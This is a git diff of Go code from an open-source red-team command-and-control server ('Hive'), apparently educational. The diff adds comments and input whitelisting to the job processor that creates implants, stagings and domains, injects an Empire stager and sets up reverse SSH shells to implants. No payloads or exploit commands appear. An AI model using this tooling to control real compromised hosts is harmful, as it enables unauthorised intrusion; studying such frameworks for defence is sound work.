@@ -1,11 +1,4 @@
 //{{{{{{{ Hive Jobs Functions }}}}}}}
-
-//// Every command related orders sent to Hive from Clients or console Input and their crafting/process
-// A. console
-// B. rinteract
-// C. binteract
-// D. ...
-
 //By Rebujacker - Alvaro Folgado Rueda as an open source educative project
 
 package main
@@ -27,9 +20,10 @@ import (
 )
 
 
-////Commands JSON, will fit in Job "parameter" field
 
-//CreateImplant
+
+//The following structs defines JSON commands that will be de-serialized by Hive. They are originated crafted within electronGUI by Ops. 
+//JSON Objects created at: ./src/client/electronGUI/components/createforms/forms.js
 type CreateImplant struct {
 	Offline string `json:"offline"`
     Name string   `json:"name"`
@@ -43,7 +37,7 @@ type CreateImplant struct {
     PersistenceWindowsP string `json:"persistencewindowsp"`
     PersistenceLin string `json:"persistencelinux"`
     PersistenceLinP string `json:"persistencelinuxp"`
-    Redirectors  []Red `json:"redirectors"`
+    Redirectors  []Red `json:"redirectors"` //Array of Serialized "Red" JSON Objects Strings
 }
 
 
@@ -52,21 +46,12 @@ type Red struct{
     Domain string `json:"domain"`
 }
 
-//Inject Shell
+//JSON Objects created at: ./src/client/electronGUI/components/bichito/bichito.js
 type InjectEmpire struct {
     Staging string   `json:"staging"`
 }
 
-
-type InjectRevSshShellBichito struct {
-    Domain string   `json:"domain"`
-    Sshkey string   `json:"sshkey"`
-    Port string   `json:"port"`
-    User string   `json:"user"`
-}
-
-
-// Drop Implant to Droplet
+//JSON Objects created at: ./src/client/electronGUI/components/implant/implant.js
 type DropImplant struct {
 	Implant string   `json:"implant"`
     Staging string   `json:"staging"`
@@ -74,7 +59,6 @@ type DropImplant struct {
     Arch string   `json:"arch"`
     Filename string   `json:"filename"`
 }
-
 
 //Deletes
 type DeleteImplant struct{
@@ -93,12 +77,6 @@ type DeleteStaging struct{
     Name string `json:"name"`
 }
 
-
-//Implant Checking,future use for gather information of bot
-type BiChecking struct{
-    Hostname string `json:"hostname"`
-}
-
 //Hive Operations
 type AddOperator struct {
     Username string   `json:"username"`
@@ -106,7 +84,40 @@ type AddOperator struct {
 }
 
 
-//Queues for Hive/Bichitos Jobs, two different queues to avoid blocking footholds on logn Hive Jobs
+
+/*
+Implant Related JSON Objects
+*/
+//Used to send System Info serialized JSON data from Implants and de-serialize it on Hive.
+//Same mappings: ./src/bichito/modules/biterpreter/sysinfo_*.go
+type SysInfo struct {
+    Pid string  `json:"pid"`
+    Arch string  `json:"arch"`
+    Os string  `json:"os"`
+    OsV string  `json:"osv"`
+    Hostname string   `json:"hostname"` 
+    Mac string  `json:"mac"`
+    User        string   `json:"user"`   
+    Privileges string   `json:"privileges"`
+}
+
+//Used to send detailed information to Bichito for an Reverse SSH Interaction.
+//Same mappings: ./src/bichito/modules/biterpreter/inject_rev_sshShell*.go
+type InjectRevSshShellBichito struct {
+    Domain string   `json:"domain"`
+    Sshkey string   `json:"sshkey"`
+    Port string   `json:"port"`
+    User string   `json:"user"`
+}
+
+
+/*
+Description: Queues for Hive/Bichitos Jobs, two different queues to avoid blocking footholds on long timed Hive Jobs
+Flow:
+A. Lock the "on-memory" Job slice
+B. Queue the Job, and set the "Working" field to false (Because if this function is run at the end of a JobProcessor Iteration, to shows is free)
+C. Start another JobProcessor routine with input "true", so it let jobProcessor knows that is being called from an enqueued action
+*/
 type hiveJobQueue struct {
     mux  sync.RWMutex
     Working bool
@@ -127,7 +138,7 @@ func hiveJobFin(){
 
 	return
 }
-//
+
 type bichitosJobQueue struct {
     mux  sync.RWMutex
     Working bool
@@ -151,10 +162,44 @@ func bichitosJobFin(){
 
 
 
+/*
+Description: Hive Job Processor Function. This function will consume Job objects,escape the inputs, process the parameters and
+trigger a target function, and wrap the final result towards the DB or a target Implant.
+Flow:
+A. Identify is the Job is meant to be: 
+	1.Processed by Hive, 
+	2.Coming from Redirectors(logs),
+	3.From Operators to Implants,
+	4.The Jobs that come back from Implants to Hive
 
+(1 & 3) Perform the "Job Queue Handling". This section will be in charge of avoid race conditions between jobs coming from
+Implants and Jobs for the Hive to be processed.
+	A. Check if JobProcessor routine is being spawned from a Queue Function, if not, add the Job to the queue (In this way with don't re-queue Jobs)
+	B. Check if there is another routine for Hove Jobs already working
+	C. Get the first Job from the queue and continue
+
+(1) The "Hive Job Switcher". Identify the Hive Job and proceed:
+	A. Escape/White-List Inputs for a Hive Job
+	B. Trigger the target creation/deletion of resource routine (create Implant, staging, operator...)
+
+(3) The "Implant Sending Job Switcher". Identify the Job against Implants,and 2 different scenarios:
+	A. Simply wrap the Job to be sent to the right Implant/Redirector
+	B. Special commands that require steps from Hive, before sending the Job to the Implant
+
+(2) For "2" simply process the Redirector Log and save them within DB
+
+(4) For "Implant Receiving Job Switcher". Identify the Job against Implants,and 4 different scenarios:
+	A. Process the Job and Update DB with the result
+	B. Check-In Bichito within DB
+	C. Process Implants Logs
+	D. Special situations (persistence, update Implant sysnfo...)
+
+B.This function/woutine will terminate normally or call "JiveJobFin/bichitosJobFin" on defer to keep processing Jobs 
+*/
 
 func jobProcessor(jobO *Job,queue bool){
 
+	//On function vars that will be commonly used
 	var(
 		jStatus error
 		jResult error
@@ -167,19 +212,17 @@ func jobProcessor(jobO *Job,queue bool){
 		parameters string
 	)
 
-	//Jobs that come from users to Hive
+	//Jobs that come from users to be processed by Hive
 	if strings.Contains(jobO.Pid,"Hive"){
 
 		//Hive Job Queue: Put Hive Jobs on a queue to avoid DB Write Locks
-		//Debug
-		//fmt.Println(len(hivejobqueue.Jobs))
-
 		if !queue{
 			hivejobqueue.mux.Lock()
 			hivejobqueue.Jobs = append(hivejobqueue.Jobs,jobO)
 			hivejobqueue.mux.Unlock()
 		}
 		
+		//If working within another routine, just kill this one,if not set the queue field on "Working"
 		if (hivejobqueue.Working){
 			return
 		}else{
@@ -188,14 +231,14 @@ func jobProcessor(jobO *Job,queue bool){
 			hivejobqueue.mux.Unlock()	
 		}
 
-
+		//Defer so Job Processor is closed with the Queue function properly
 		defer hiveJobFin()
 
-    	//Don't add Parameters in the Job Log to avoid unnecessary secrets logging
+    	//Don't add/Remove Parameters in the Job Log to avoid unnecessary secrets logging
     	parameters := hivejobqueue.Jobs[0].Parameters
     	hivejobqueue.Jobs[0].Parameters = "" 
 
-    	//check redundant Jid
+    	//check redundant Jid, if JID exists, log the error
     	errJ := addJobDB(hivejobqueue.Jobs[0])
     	if errJ != nil {
         	//ErrorLog
@@ -205,6 +248,7 @@ func jobProcessor(jobO *Job,queue bool){
         	return
     	}
 
+    	//Since Processing the Job can take a time, set the status to processing
    		errS := setJobStatusDB(hivejobqueue.Jobs[0].Jid,"Processing")
     	if errS != nil {
         	//ErrorLog
@@ -214,6 +258,7 @@ func jobProcessor(jobO *Job,queue bool){
         	return
     	}
 
+    	//Extract Job params from the first element of the queue
 		cid = hivejobqueue.Jobs[0].Cid
 		pid = hivejobqueue.Jobs[0].Pid
 		chid = hivejobqueue.Jobs[0].Chid
@@ -221,9 +266,20 @@ func jobProcessor(jobO *Job,queue bool){
 		job = hivejobqueue.Jobs[0].Job	
 		jobO = hivejobqueue.Jobs[0]
 
+		//"Hive Job Switcher"
 		switch job{
-			case "createImplant":
+			/* 
+			These Hive to process commands have a common pattern:
+			A. Their objective: Create or delete Resources (Implants,VPS,Stagings,Operators...)
+			B. Decode the Json-Job Body towards the right Command-Object. JSON is used here since there is a lot of inner parameters.
+			C. White-List every string decoded (Not escaping Persistence params yet)
+			D. Forcreating resources, check if it exists, if not, start the creation/deletion routine
+			Note:
+				A lot of these commands have an extra error check to detect DB Lock problems. They will be removed in the future if 
+				no more of these errors are generated
 
+			*/
+			case "createImplant":
     			jsconcommanA := make([]CreateImplant, 0)
     			decoder := json.NewDecoder(bytes.NewBufferString(parameters))
     			errD := decoder.Decode(&jsconcommanA)
@@ -306,6 +362,7 @@ func jobProcessor(jobO *Job,queue bool){
 							return
 						}
 
+					//TO-DO: No Escaping for the moment
 					case "gmailgo":
 					case "gmailmimic":
 
@@ -386,7 +443,7 @@ func jobProcessor(jobO *Job,queue bool){
     			commandO := jsconcommanA[0]
     			if errD != nil {
 					jStatus = setJobStatusDB(jid,"Error")
-					jResult = setJobResultDB(jid,"Hive-createImplant("+commandO.Name+" created)")
+					jResult = setJobResultDB(jid,"Hive-deleteImplant("+commandO.Name+" created)")
 					if (jStatus != nil){
         				time := time.Now().Format("02/01/2006 15:04:05 MST")
         				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
@@ -485,7 +542,7 @@ func jobProcessor(jobO *Job,queue bool){
     			}
 
 
-    			//Decode VPC by type and do formatting check
+    			//Decode VPC by type and do formatting check, this is important because a lot of string data will be used within terraform
 				switch result.Vtype{
 
 					case "aws_instance":
@@ -494,16 +551,17 @@ func jobProcessor(jobO *Job,queue bool){
 						if errDaws != nil {
 							jStatus = setJobStatusDB(jid,"Error")
 							jResult = setJobResultDB(jid,"VPC Add(Amazon Parameters Decoding Error):"+errDaws.Error())
-					if (jStatus != nil){
-        				time := time.Now().Format("02/01/2006 15:04:05 MST")
-        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
-        				return
-					}
-					if (jResult != nil){
-        				time := time.Now().Format("02/01/2006 15:04:05 MST")
-        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
-        				return
-					}
+						
+							if (jStatus != nil){
+        						time := time.Now().Format("02/01/2006 15:04:05 MST")
+        						go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
+        						return
+							}
+							if (jResult != nil){
+        						time := time.Now().Format("02/01/2006 15:04:05 MST")
+        						go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
+        						return
+							}
 
 							return
 						}
@@ -514,16 +572,17 @@ func jobProcessor(jobO *Job,queue bool){
 							
 							jStatus = setJobStatusDB(jid,"Error")
 							jResult = setJobResultDB(jid,"Hive-VPC Add(VPC Amazon Incorrect Param. Formatting)")
-					if (jStatus != nil){
-        				time := time.Now().Format("02/01/2006 15:04:05 MST")
-        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
-        				return
-					}
-					if (jResult != nil){
-        				time := time.Now().Format("02/01/2006 15:04:05 MST")
-        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
-        				return
-					}
+						
+							if (jStatus != nil){
+        						time := time.Now().Format("02/01/2006 15:04:05 MST")
+        						go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
+        						return
+							}
+							if (jResult != nil){
+        						time := time.Now().Format("02/01/2006 15:04:05 MST")
+        						go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
+        						return
+							}
 
 							return
     					}
@@ -532,18 +591,17 @@ func jobProcessor(jobO *Job,queue bool){
 						jStatus = setJobStatusDB(jid,"Error")
 						jResult = setJobResultDB(jid,"Hive-VPC Add(VPC Type not yet Implemented)")
 						
-					if (jStatus != nil){
-        				time := time.Now().Format("02/01/2006 15:04:05 MST")
-        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
-        				return
-					}
-					if (jResult != nil){
-        				time := time.Now().Format("02/01/2006 15:04:05 MST")
-        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
-        				return
-					}
+						if (jStatus != nil){
+        					time := time.Now().Format("02/01/2006 15:04:05 MST")
+        					go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
+        					return
+						}
+						if (jResult != nil){
+        					time := time.Now().Format("02/01/2006 15:04:05 MST")
+        					go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
+        					return
+						}
 						
-						return
 				}
 
 
@@ -720,16 +778,16 @@ func jobProcessor(jobO *Job,queue bool){
 						if errDaws != nil {
 							jStatus = setJobStatusDB(jid,"Error")
 							jResult = setJobResultDB(jid,"Domain Add(Godaddy Parameters Decoding Error):"+errDaws.Error())
-					if (jStatus != nil){
-        				time := time.Now().Format("02/01/2006 15:04:05 MST")
-        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
-        				return
-					}
-					if (jResult != nil){
-        				time := time.Now().Format("02/01/2006 15:04:05 MST")
-        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
-        				return
-					}
+							if (jStatus != nil){
+        						time := time.Now().Format("02/01/2006 15:04:05 MST")
+        						go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
+        						return
+						}
+						if (jResult != nil){
+        					time := time.Now().Format("02/01/2006 15:04:05 MST")
+        					go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
+        					return
+						}
 
 							return
 						}
@@ -739,16 +797,17 @@ func jobProcessor(jobO *Job,queue bool){
 							
 							jStatus = setJobStatusDB(jid,"Error")
 							jResult = setJobResultDB(jid,"Hive-Domain Add(Domain GoDaddy Incorrect Param. Formatting)")
-					if (jStatus != nil){
-        				time := time.Now().Format("02/01/2006 15:04:05 MST")
-        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
-        				return
-					}
-					if (jResult != nil){
-        				time := time.Now().Format("02/01/2006 15:04:05 MST")
-        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
-        				return
-					}
+							
+							if (jStatus != nil){
+        						time := time.Now().Format("02/01/2006 15:04:05 MST")
+        						go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
+        						return
+							}
+							if (jResult != nil){
+        						time := time.Now().Format("02/01/2006 15:04:05 MST")
+        						go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
+        						return
+							}
 
 							return
     					}
@@ -759,16 +818,16 @@ func jobProcessor(jobO *Job,queue bool){
 						if errDaws != nil {
 							jStatus = setJobStatusDB(jid,"Error")
 							jResult = setJobResultDB(jid,"Domain Add(GoogleParameters Decoding Error):"+errDaws.Error())
-					if (jStatus != nil){
-        				time := time.Now().Format("02/01/2006 15:04:05 MST")
-        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
-        				return
-					}
-					if (jResult != nil){
-        				time := time.Now().Format("02/01/2006 15:04:05 MST")
-        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
-        				return
-					}
+							if (jStatus != nil){
+        						time := time.Now().Format("02/01/2006 15:04:05 MST")
+        						go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
+        						return
+							}
+							if (jResult != nil){
+        						time := time.Now().Format("02/01/2006 15:04:05 MST")
+        						go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
+        						return
+							}
 
 							return
 						}
@@ -780,33 +839,34 @@ func jobProcessor(jobO *Job,queue bool){
 
 							jStatus = setJobStatusDB(jid,"Error")
 							jResult = setJobResultDB(jid,"Hive-Domain Add(SAAS Gmail Incorrect Param. Formatting)")
-					if (jStatus != nil){
-        				time := time.Now().Format("02/01/2006 15:04:05 MST")
-        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
-        				return
-					}
-					if (jResult != nil){
-        				time := time.Now().Format("02/01/2006 15:04:05 MST")
-        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
-        				return
-					}
+							if (jStatus != nil){
+        						time := time.Now().Format("02/01/2006 15:04:05 MST")
+        						go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
+        						return
+							}
+							if (jResult != nil){
+        						time := time.Now().Format("02/01/2006 15:04:05 MST")
+        						go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
+        						return
+							}
 
 							return
     					}
+
 					default:
 						jStatus = setJobStatusDB(jid,"Error")
 						jResult = setJobResultDB(jid,"Hive-Domain Add(Domain Type not yet Implemented)")
-					if (jStatus != nil){
-        				time := time.Now().Format("02/01/2006 15:04:05 MST")
-        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
-        				return
-					}
-					if (jResult != nil){
-        				time := time.Now().Format("02/01/2006 15:04:05 MST")
-        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
-        				return
-					}
-						return
+						if (jStatus != nil){
+        					time := time.Now().Format("02/01/2006 15:04:05 MST")
+        					go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
+        					return
+						}
+						
+						if (jResult != nil){
+        					time := time.Now().Format("02/01/2006 15:04:05 MST")
+        					go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
+        					return
+						}
 				}
 
 				existV,_ := existDomainDB(commandO.Name)
@@ -982,16 +1042,16 @@ func jobProcessor(jobO *Job,queue bool){
 						if errDaws != nil {
 							jStatus = setJobStatusDB(jid,"Error")
 							jResult = setJobResultDB(jid,"Staging Add(Droplet Parameters Decoding Error):"+errDaws.Error())
-					if (jStatus != nil){
-        				time := time.Now().Format("02/01/2006 15:04:05 MST")
-        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
-        				return
-					}
-					if (jResult != nil){
-        				time := time.Now().Format("02/01/2006 15:04:05 MST")
-        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
-        				return
-					}
+							if (jStatus != nil){
+        						time := time.Now().Format("02/01/2006 15:04:05 MST")
+        						go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
+        						return
+							}
+							if (jResult != nil){
+        						time := time.Now().Format("02/01/2006 15:04:05 MST")
+        						go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
+        						return
+							}
 							
 							return
 						}
@@ -1002,16 +1062,16 @@ func jobProcessor(jobO *Job,queue bool){
 
 							jStatus = setJobStatusDB(jid,"Error")
 							jResult = setJobResultDB(jid,"Staging Add(Droplet Incorrect Param. Formatting)")
-					if (jStatus != nil){
-        				time := time.Now().Format("02/01/2006 15:04:05 MST")
-        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
-        				return
-					}
-					if (jResult != nil){
-        				time := time.Now().Format("02/01/2006 15:04:05 MST")
-        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
-        				return
-					}
+							if (jStatus != nil){
+        						time := time.Now().Format("02/01/2006 15:04:05 MST")
+        						go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
+        					return
+							}
+							if (jResult != nil){
+        						time := time.Now().Format("02/01/2006 15:04:05 MST")
+        						go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
+        						return
+							}
 
 							return
     					}
@@ -1022,16 +1082,16 @@ func jobProcessor(jobO *Job,queue bool){
 						if errDaws != nil {
 							jStatus = setJobStatusDB(jid,"Error")
 							jResult = setJobResultDB(jid,"Staging Add(MSFT Parameters Decoding Error):"+errDaws.Error())
-					if (jStatus != nil){
-        				time := time.Now().Format("02/01/2006 15:04:05 MST")
-        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
-        				return
-					}
-					if (jResult != nil){
-        				time := time.Now().Format("02/01/2006 15:04:05 MST")
-        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
-        				return
-					}
+							if (jStatus != nil){
+        						time := time.Now().Format("02/01/2006 15:04:05 MST")
+        						go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
+        						return
+							}
+							if (jResult != nil){
+        						time := time.Now().Format("02/01/2006 15:04:05 MST")
+        						go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
+        						return
+							}
 
 							return
 						}
@@ -1041,16 +1101,16 @@ func jobProcessor(jobO *Job,queue bool){
 
 							jStatus = setJobStatusDB(jid,"Error")
 							jResult = setJobResultDB(jid,"Staging Add(MSFT Incorrect Param. Formatting)")
-					if (jStatus != nil){
-        				time := time.Now().Format("02/01/2006 15:04:05 MST")
-        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
-        				return
-					}
-					if (jResult != nil){
-        				time := time.Now().Format("02/01/2006 15:04:05 MST")
-        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
-        				return
-					}
+							if (jStatus != nil){
+        						time := time.Now().Format("02/01/2006 15:04:05 MST")
+        						go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
+        						return
+							}
+							if (jResult != nil){
+        						time := time.Now().Format("02/01/2006 15:04:05 MST")
+        						go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
+        						return
+							}
 
 							return
     					}
@@ -1061,16 +1121,16 @@ func jobProcessor(jobO *Job,queue bool){
 						if errDaws != nil {
 							jStatus = setJobStatusDB(jid,"Error")
 							jResult = setJobResultDB(jid,"Staging Add(MSFT Parameters Decoding Error):"+errDaws.Error())
-					if (jStatus != nil){
-        				time := time.Now().Format("02/01/2006 15:04:05 MST")
-        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
-        				return
-					}
-					if (jResult != nil){
-        				time := time.Now().Format("02/01/2006 15:04:05 MST")
-        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
-        				return
-					}
+							if (jStatus != nil){
+        						time := time.Now().Format("02/01/2006 15:04:05 MST")
+        						go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
+        						return
+							}
+							if (jResult != nil){
+        						time := time.Now().Format("02/01/2006 15:04:05 MST")
+        						go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
+        						return
+							}
 
 							return
 						}
@@ -1080,56 +1140,55 @@ func jobProcessor(jobO *Job,queue bool){
 
 							jStatus = setJobStatusDB(jid,"Error")
 							jResult = setJobResultDB(jid,"Staging Add(MSFT Incorrect Param. Formatting)")
-					if (jStatus != nil){
-        				time := time.Now().Format("02/01/2006 15:04:05 MST")
-        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
-        				return
-					}
-					if (jResult != nil){
-        				time := time.Now().Format("02/01/2006 15:04:05 MST")
-        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
-        				return
-					}
+							if (jStatus != nil){
+        						time := time.Now().Format("02/01/2006 15:04:05 MST")
+        						go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
+        						return
+							}
+							if (jResult != nil){
+        						time := time.Now().Format("02/01/2006 15:04:05 MST")
+        						go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
+        						return
+							}
 
 							return
     					}
 
     				case "ssh_rev_shell":
 
-    					if !(namesInputWhite(commandO.Name) && namesInputWhite(commandO.VpsName) && 
+    				if !(namesInputWhite(commandO.Name) && namesInputWhite(commandO.VpsName) && 
     						namesInputWhite(commandO.DomainName)){
 
 							jStatus = setJobStatusDB(jid,"Error")
 							jResult = setJobResultDB(jid,"Staging Add(Rev. SSH Incorrect params formatting)")
-					if (jStatus != nil){
-        				time := time.Now().Format("02/01/2006 15:04:05 MST")
-        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
-        				return
-					}
-					if (jResult != nil){
-        				time := time.Now().Format("02/01/2006 15:04:05 MST")
-        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
-        				return
-					}
+							if (jStatus != nil){
+        						time := time.Now().Format("02/01/2006 15:04:05 MST")
+        						go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
+        						return
+							}
+							if (jResult != nil){
+        						time := time.Now().Format("02/01/2006 15:04:05 MST")
+        						go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
+        						return
+							}
 
-							return
-    					}
+						return
+    				}
 
 					default:
 						jStatus = setJobStatusDB(jid,"Error")
 						jResult = setJobResultDB(jid,"Staging Add(Staging Type not yet Implemented)")
-					if (jStatus != nil){
-        				time := time.Now().Format("02/01/2006 15:04:05 MST")
-        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
-        				return
-					}
-					if (jResult != nil){
-        				time := time.Now().Format("02/01/2006 15:04:05 MST")
-        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
-        				return
-					}
+						if (jStatus != nil){
+        					time := time.Now().Format("02/01/2006 15:04:05 MST")
+        					go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
+        					return
+						}
+						if (jResult != nil){
+        					time := time.Now().Format("02/01/2006 15:04:05 MST")
+        					go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
+        					return
+						}
 
-					return
 				}	
 
 
@@ -1298,6 +1357,24 @@ func jobProcessor(jobO *Job,queue bool){
 					return
     			}
 
+    			if !namesInputWhite(commandO.Staging){
+					jStatus = setJobStatusDB(jid,"Error")
+					jResult = setJobResultDB(jid,"Hive-dropImplant(Staging "+commandO.Staging+" Incorrect Param. Formatting)")
+					if (jStatus != nil){
+        				time := time.Now().Format("02/01/2006 15:04:05 MST")
+        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
+        				return
+					}
+					if (jResult != nil){
+        				time := time.Now().Format("02/01/2006 15:04:05 MST")
+        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
+        				return
+					}
+					
+					return
+    			}
+
+
 				existI,_ := existStagingDB(commandO.Staging)
 				if !existI{
 					jStatus = setJobStatusDB(jid,"Error")
@@ -1316,7 +1393,6 @@ func jobProcessor(jobO *Job,queue bool){
 				}
 
 				stagingO := getStagingDB(commandO.Staging)
-				//fmt.Println(strings.Contains(stagingO.Stype,"droplet"))
 				if !strings.Contains(stagingO.Stype,"droplet"){
 					jStatus = setJobStatusDB(jid,"Error")
 					jResult = setJobResultDB(jid,"Hive-dropImplant(Staging is not a Droplet)")
@@ -1514,9 +1590,22 @@ func jobProcessor(jobO *Job,queue bool){
 					return
    				}
 
-   				//Debug
-   				//fmt.Println("CID:"+cid)
-   				//fmt.Println("Is admin??:"+isUserAdminDB(jobO.Cid))
+   				//Escape JID
+    			if !idsInputWhite(jobO.Cid){
+					jStatus = setJobStatusDB(jid,"Error")
+					jResult = setJobResultDB(jid,"Hive-addOperator(Report "+jobO.Cid+" Incorrect Param. Formatting)")
+					if (jStatus != nil){
+        				time := time.Now().Format("02/01/2006 15:04:05 MST")
+        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
+        				return
+					}
+					if (jResult != nil){
+        				time := time.Now().Format("02/01/2006 15:04:05 MST")
+        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
+        				return
+					}
+					return
+    			} 
 
    				if isUserAdminDB(jobO.Cid) != "Yes"{
    					jStatus = setJobStatusDB(jid,"Error")
@@ -1567,6 +1656,7 @@ func jobProcessor(jobO *Job,queue bool){
 				}
 
 
+			//If the Job Name String is not found register an Error
 			default:
 				jStatus = setJobStatusDB(jid,"Error")
 				jResult = setJobResultDB(jid,"Hive-JobNotImplemented")
@@ -1583,7 +1673,7 @@ func jobProcessor(jobO *Job,queue bool){
 				return
 		}
 
-	// Jobs coming from Redirectors,but not from Footholds
+	//Jobs coming from Redirectors (not from Footholds) for the moment just logs
